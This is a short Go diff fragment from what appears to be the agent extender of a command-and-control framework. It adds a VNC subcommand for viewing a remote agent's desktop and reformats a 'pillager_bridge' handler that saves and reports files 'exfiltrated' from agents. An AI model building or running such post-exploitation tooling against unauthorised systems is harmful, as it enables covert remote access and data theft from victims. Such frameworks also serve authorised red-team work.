+			taskData.Message = fmt.Sprintf("VNC Viewer: open /vnc/viewer?local=%d in browser after vnc_stream is listening on the agent", localPort)
+			taskData.MessageType = adaptix.MESSAGE_SUCCESS
+			taskData.ClearText = "\n"
+
+		} else if subcommand == "list" {
+			taskData.Message = "Active VNC sessions can be viewed via the Tunnels tab. Look for VNC Desktop tunnels."
+			taskData.MessageType = adaptix.MESSAGE_SUCCESS
+			taskData.ClearText = "\n"
+
+		} else {
+			err = errors.New("subcommand must be start, native, deploy, stop, view, or list")
+			goto RET
+		}
 
 	default:
 		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
@@ -2334,8 +2805,8 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 
 				_ = Ts.TsDownloadAdd(agentData.Id, fileId, filename, int64(len(data)))
 				_ = Ts.TsDownloadSave(agentData.Id, fileId, filename, data)
-				
-				Ts.TsAgentConsoleOutput(agentData.Id, adaptix.MESSAGE_SUCCESS, "pillager_bridge", 
+
+				Ts.TsAgentConsoleOutput(agentData.Id, adaptix.MESSAGE_SUCCESS, "pillager_bridge",
 					fmt.Sprintf("[+] File exfiltrated: %s (%v bytes)", filename, len(data)), true)
 
 			} else {
